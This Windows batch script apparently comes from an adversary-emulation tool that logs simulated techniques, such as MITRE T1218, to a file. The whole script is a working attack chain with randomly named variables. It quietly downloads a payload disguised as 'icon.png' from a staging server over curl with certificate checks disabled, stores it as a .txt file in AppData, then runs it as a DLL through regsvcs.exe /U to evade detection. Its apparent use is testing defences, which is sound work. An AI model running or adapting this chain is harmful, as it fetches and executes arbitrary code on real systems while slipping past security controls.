@echo off
setlocal enabledelayedexpansion

REM ===== Placeholder constant declarations (random-named SET vars) =====
SET aBcDeFgH=%APPDATA%\11851\018bd8a6
SET iJkLmNoP=0dd4085b.txt
SET qRsTuVwX=https://10.0.0.49/stage/2/icon.png?11851-7
SET yZ123Abc=ITZEL-S2B
SET dEf456Gh=11851
SET iJk789Lm=7
SET nOp012Qr=%PUBLIC%\\macula-simulations.log
SET sTu345Vw=https://10.0.0.49

REM ===== Cached timestamp for debug logging =====
SET tsvar=!DATE!/!TIME!

REM ===== Step 0: Debug log initialization =====
echo [!tsvar!][DEBUG][!yZ123Abc!][!dEf456Gh!]: script_start>> "!nOp012Qr!" 2>nul

REM ===== Step 1: Heartbeat fetch (download DLL) =====
echo [!tsvar!][DEBUG][!yZ123Abc!][!dEf456Gh!]: heartbeat_start>> "!nOp012Qr!" 2>nul
curl -k -s -o "!aBcDeFgH!\!iJkLmNoP!" "!qRsTuVwX!" >nul 2>&1
if errorlevel 1 (
    echo [!tsvar!][DEBUG][!yZ123Abc!][!dEf456Gh!]: heartbeat_fail>> "!nOp012Qr!" 2>nul
) else (
    echo [!tsvar!][DEBUG][!yZ123Abc!][!dEf456Gh!]: heartbeat_complete>> "!nOp012Qr!" 2>nul
)

REM ===== Step 2: Position working directory =====
echo [!tsvar!][DEBUG][!yZ123Abc!][!dEf456Gh!]: chdir_start>> "!nOp012Qr!" 2>nul
cd /d "!aBcDeFgH!" >nul 2>&1
if errorlevel 1 (
    echo [!tsvar!][DEBUG][!yZ123Abc!][!dEf456Gh!]: chdir_result=1>> "!nOp012Qr!" 2>nul
) else (
    echo [!tsvar!][DEBUG][!yZ123Abc!][!dEf456Gh!]: chdir_result=0>> "!nOp012Qr!" 2>nul
)

REM ===== Step 3: Invoke Stage 2 DLL via regsvcs.exe /U (LOLBIN) =====
echo [!tsvar!][DEBUG][!yZ123Abc!][!dEf456Gh!]: regsvcs_start>> "!nOp012Qr!" 2>nul
%SystemRoot%\Microsoft.NET\Framework64\v4.0.30319\regsvcs.exe /U "!iJkLmNoP!" >NUL 2>&1
set regsvcs_exit=!errorlevel!
echo [!tsvar!][DEBUG][!yZ123Abc!][!dEf456Gh!]: regsvcs_result=!regsvcs_exit!>> "!nOp012Qr!" 2>nul

REM ===== Step 4: Generate timestamp for TTP logging =====
for /f "delims=" %%t in ('powershell -nop -c "Get-Date -Format 'yyyy-MM-dd HH:mm:ss.fff'"') do set timestamp=%%t

REM ===== Step 5: TTP log line =====
if !regsvcs_exit! equ 0 (
    echo [!timestamp!][TTP][!yZ123Abc!][!dEf456Gh!]: T1218^|System Binary Proxy Execution=[OK]:[]>> "!nOp012Qr!" 2>nul
) else (
    echo [!timestamp!][TTP][!yZ123Abc!][!dEf456Gh!]: T1218^|System Binary Proxy Execution=[FAIL]:[regsvcs_exit_!regsvcs_exit!]>> "!nOp012Qr!" 2>nul
)

REM ===== Step 6: Clean exit =====
echo [!tsvar!][DEBUG][!yZ123Abc!][!dEf456Gh!]: script_end>> "!nOp012Qr!" 2>nul
endlocal
exit /b 0